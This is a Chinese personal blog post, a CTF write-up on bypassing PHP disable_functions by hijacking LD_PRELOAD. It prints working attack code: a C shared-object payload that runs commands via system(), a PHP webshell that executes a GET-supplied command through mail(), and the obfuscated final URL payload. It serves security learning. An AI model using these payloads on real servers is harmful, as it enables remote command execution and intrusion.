<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Arsene.Tang &#39;s Blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="利用LD_PRELOAD绕过disable_functions这个知识点的原型是出自极客大挑战2019的RCE me，当成功拿到shell后，却发现无法执行命令，当然也就拿不到flag，不能执行命令的shell基本上就没啥用，通常来说，导致webshell不能执行命令的原因有三类：一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类">
<meta property="og:type" content="article">
<meta property="og:title" content="Arsene.Tang &#39;s Blogs">
<meta property="og:url" content="http://example.com/2021/07/07/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disable_function/index.html">
<meta property="og:site_name" content="Arsene.Tang &#39;s Blogs">
<meta property="og:description" content="利用LD_PRELOAD绕过disable_functions这个知识点的原型是出自极客大挑战2019的RCE me，当成功拿到shell后，却发现无法执行命令，当然也就拿不到flag，不能执行命令的shell基本上就没啥用，通常来说，导致webshell不能执行命令的原因有三类：一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="d:/笔记/img/image-20210513133952334.png">
<meta property="og:image" content="d:/笔记/img/image-20210517113646137.png">
<meta property="og:image" content="d:/笔记/img/image-20210517130732313.png">
<meta property="og:image" content="d:/笔记/img/image-20210517130850040.png">
<meta property="og:image" content="d:/笔记/img/image-20210517130904294.png">
<meta property="og:image" content="d:/笔记/img/image-20210517135745254.png">
<meta property="og:image" content="d:/笔记/img/image-20210517140018182.png">
<meta property="og:image" content="d:/笔记/img/image-20210517162541553.png">
<meta property="og:image" content="d:/笔记/img/image-20210517163028463.png">
<meta property="og:image" content="d:/笔记/img/image-20210517163040503.png">
<meta property="og:image" content="d:/笔记/img/image-20210517175239764.png">
<meta property="article:published_time" content="2021-07-07T04:24:01.555Z">
<meta property="article:modified_time" content="2021-06-10T06:49:18.056Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="d:/笔记/img/image-20210513133952334.png">
  
    <link rel="alternate" href="/atom.xml" title="Arsene.Tang 's Blogs" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Arsene.Tang &#39;s Blogs</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-利用LD_PRELOAD绕过disable_function" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/07/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disable_function/" class="article-date">
  <time class="dt-published" datetime="2021-07-07T04:24:01.555Z" itemprop="datePublished">2021-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="利用LD-PRELOAD绕过disable-functions"><a href="#利用LD-PRELOAD绕过disable-functions" class="headerlink" title="利用LD_PRELOAD绕过disable_functions"></a>利用LD_PRELOAD绕过disable_functions</h1><p>这个知识点的原型是出自极客大挑战2019的RCE me，当成功拿到shell后，却发现无法执行命令，当然也就拿不到flag，不能执行命令的shell基本上就没啥用，通常来说，导致webshell不能执行命令的原因有三类：一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell 环境中；三是 WAF 拦劫。这道题因为我们在phpinfo中看到disable_functions中看到它禁用了非常多的函数，所以说它是属于第一种，但其实第二三中还是可以执行少量命令的，但第一种是完全无法执行命令。</p>
<p>而绕过disable_functions，大致是分为四种方法：</p>
<p>第一种方法是攻击后端组件，相当于就是虽然这里行不通，但我们可以寻找其它存在命令注入的地方，web应用常见的后端组件，比如说像ImageMagick 的魔图漏洞、bash 的破壳漏洞等等。我们可以利用phpinfo()查看imagemagick的版本，而存在命令注入的版本是v6.9.3-9 或 v7.0.1-0。</p>
<p>第二种方法是寻找未禁用的一些漏网之鱼，寻找一些冷门的命令执行函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，ld()，dl()函数等，逐一尝试，或许有漏网之鱼</p>
<p><img src="D:\笔记\img\image-20210513133952334.png" alt="image-20210513133952334"></p>
<p>这些函数都可以试试，具体用法百度搜索就可。</p>
<p>第三种方法是假如它开启了mod_cgi 模式，我们可以尝试修改.htaccess，调整请求访问路由，绕过php.ini 中的任何限制，但是这种方法我还不知道应该怎么实践，而且这道题这种方法也用不了。</p>
<p>第四种方法是利用环境变量LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果，这种方法是目前最火的一种方法，我们也重点讲一讲这种方法。</p>
<p>首先我们来讲一讲思路，当web启动一个新进程时a.bin时，假如它在内部调用了一个系统函数b()，而b()又位于系统共享对象c.so中，那么一来而去，系统为了加载进程a.bin就会加载c.so对象，那么我们可不可以上传一个c_evil.so，让它的优先级更高，也就是在c.so前面优先加载c_evil.so，而c_evil.so 是可控的，我们可以在里面加入与b()同名的恶意函数，那么当web启动一个新进程a.bin时，他就会调用c_evil.so中的b()而不是c.so中的b()，而c_evil.so是可控的，由我们自己上传上去的，我们可以在里面写入一些恶意代码，这样就可以达到执行恶意代码的目的。</p>
<p>了解了思路，我们得想办法在本地验证，首先我们得想办法看进程调用了哪些系统函数，找到内部启动新进程的php函数，然后就是如何劫持系统函数注入我们的恶意代码。</p>
<p>然后我们来了解了解linux 的环境变量 LD_PRELOAD，linux 的环境变量 LD_PRELOAD 是一种类似 win32 API hook 的更优雅的实现，适用于打热补丁、读取进程空间数据、禁止程序调用指定 API、调试程序等等场景，甚至可以在不更改原始可执行文件前提下植入后门（管理员常用的 /bin/ps），<strong>也就是说，LD_PRELOAD这个环境变量指定路径的文件，会在其它文件被调用之前，最先被调用</strong>，由于被劫持的系统函数得由我们重新实现一次，函数原型必须一致，为减少复杂性，我会选择劫持那些<strong>无参数且常用</strong>的系统函数，比如说像getuid()，我们先用<code>man 2 getuid</code>查看该函数的原型：</p>
<p><img src="D:\笔记\img\image-20210517113646137.png" alt="image-20210517113646137"></p>
<p>那我们就仿照这个格式，写一个getuid_eval.c，然后把它编译为共享对象，首先看看getuid_eval.c的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;echo &#x27;wllm_yyds!!&#x27;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果它成功被执行了，那么就会成功显示出那句话，然后我们将这段代码保存在/root/目录下，</p>
<p><img src="D:\笔记\img\image-20210517130732313.png" alt="image-20210517130732313"></p>
<p>然后我们执行<code>gcc -shared -fPIC getuid_eval.c -o getuid_eval.so</code>将其编译为共享对象，这一步可能会出很多问题，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_48233584/article/details/106431199%EF%BC%8C%E6%88%91%E6%98%AF%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E4%BA%86%E4%B8%80%E9%81%8Dgcc%E5%B0%B1%E5%A5%BD%E4%BA%86%EF%BC%8C%E6%9C%80%E5%90%8E%E5%B0%B1%E6%98%AF%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E5%8A%AB%E6%8C%81getuid%E5%87%BD%E6%95%B0%EF%BC%8C%E6%89%A7%E8%A1%8C%E6%88%91%E4%BB%AC%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%60LD_PRELOAD=/root/getuid_eval.so">https://blog.csdn.net/m0_48233584/article/details/106431199，我是重新安装了一遍gcc就好了，最后就是利用环境变量LD_PRELOAD劫持getuid函数，执行我们的命令，执行`LD_PRELOAD=/root/getuid_eval.so</a> /usr/bin/id`</p>
<p><img src="D:\笔记\img\image-20210517130850040.png" alt="image-20210517130850040"></p>
<p><img src="D:\笔记\img\image-20210517130904294.png" alt="image-20210517130904294"></p>
<p>就这样执行成功，我也不知道为什么它要执行这么多遍，哈哈哈哈问题不大，总之是成功执行了。</p>
<p>第一个问题解决了，接下来我们就要想办法找到可以启动新进程的php函数了，虽然说LD_PRELOAD可以劫持系统函数，但起码你得用php启动一个新进程才可以，php脚本中可以启动新进程的函数很多，比如说像什么<code> system()、exec()、shell_exec()</code>这些都可以，但是很明显这些都用不了，否则我们就不用这么麻烦的来绕disable_functions了，还有哪种可能启动外部程序呢？就是php 解释器自身，比如说像php函数goForward()，可以实现前进功能，这个函数是不存在的哈，只是一种模型，goForward()函数又由组成php解释器的move.c实现，而move.c又通过调用外部程序go.bin实现，这样的话当我们调用goForward()时就一定会加载外部程序go.bin(这可能有点绕得好好理理)，就达到我们的目的了，而真实存在的类似goForward()的php函数主要存在于处理图片，请求网页，发送邮件中，经过验证，只有发送邮件的mail函数会启动一个新进程，而其它的都只是启动php解释器而已，启动进程的函数是<code>execve</code>，我们先写一个mail.php来验证，源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   mail(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后把它存到/tmp目录下，<img src="D:\笔记\img\image-20210517135745254.png" alt="image-20210517135745254"></p>
<p>然后我们运行<code>strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve</code>来查看这个函数是否启动新进程：</p>
<p><img src="D:\笔记\img\image-20210517140018182.png" alt="image-20210517140018182"></p>
<p>发现它除了会启动php解释器以外，还会启动/usr/sbin/sendmail这个新进程，这就是我们一直在找的可以启动新进程的函数啊，然后我们在mail.php中增加设置LD_PRELOAD的代码，也就是可以让它劫持系统函数注入恶意代码：</p>
<p><img src="D:\笔记\img\image-20210517162541553.png" alt="image-20210517162541553"></p>
<p>然后我们执行这个php文件，就可以执行我们的命令了。</p>
<p><img src="D:\笔记\img\image-20210517163028463.png" alt="image-20210517163028463"></p>
<p><img src="D:\笔记\img\image-20210517163040503.png" alt="image-20210517163040503"></p>
<p>这样就在不依赖命令执行函数的情况下执行了命令，但其实讲了这么多都是原理方面的东西，对于实际做ctf帮助不大，但我们可以基于前面的mail.php写出一个绕过disablefunctions的bypass_disablefunc.php，在具体做题过程中就可以将这个php上传上去完成rce：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    unlink(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实原理和上面的是完全一样的，bypass_disablefunc.php 提供三个 GET 参数。一是 cmd 参数，待执行的系统命令（如 ls等）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示(这里我上面其实是没有复现成功的，它并没有将命令执行的结果放入到一个文件中，而是直接在页面上显示了出来，我也不清楚是为什么)，另外关于该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的<strong>绝对路径</strong>（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</p>
<p>然后就是基于getuid_eval.c编写劫持函数的代码bypass_disablefunc.c，我们之前劫持getuid()，是因为sendmail程序会调用该函数，但实际做题或者真实环境中，存在两方面的问题，一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，二是即便安装了sendmail，由于未将主机名添加到host中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，所以说不太行，我们只能放弃这个函数，选一个更加通用的，GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor)) 修饰的函数。这个就很完美，bypass_disablefunc.c 源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就像上面说的那样用gcc编译成共享对象bypass_disablefunc_x64.so，这个so文件文末我会给出链接自行下载即可，然后我们将这个php文件和so文件利用菜刀上传上去，注意要找到一个可以上传的文件夹哈，上传上去以后直接包含这个文件，然后指定好命令输出路径和共享对象路径之后，就可以直接执行命令了。</p>
<p><img src="D:\笔记\img\image-20210517175239764.png" alt="image-20210517175239764"></p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
<p>所有工具：<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>那道题的最终payload：</p>
<p><code>$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/1.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/2.so</code></p>
<p>使用的是异或绕过<code>$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/07/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disable_function/" data-id="ckqszcdur0002t4vzhsmy8j3x" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/07/07/test/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          test
        
      </div>
    </a>
  
  
    <a href="/2021/07/06/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/07/test/">test</a>
          </li>
        
          <li>
            <a href="/2021/07/07/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disable_function/">(no title)</a>
          </li>
        
          <li>
            <a href="/2021/07/06/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>